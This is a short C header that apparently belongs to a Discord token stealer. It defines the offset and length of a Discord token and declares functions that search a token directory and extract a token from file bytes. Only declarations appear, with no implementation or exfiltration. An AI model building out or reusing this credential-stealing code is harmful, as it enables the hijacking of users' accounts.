#pragma once
#include "external.h"

#define DISCORD_TOKEN_DEFAULT_OFFSET 15
#define DISCORD_TOKEN_DEFAULT_LENGTH 59

PWSTR searchTokenDirectory();
PWSTR findDiscordToken(PBYTE fileContent, DWORD fileSize);

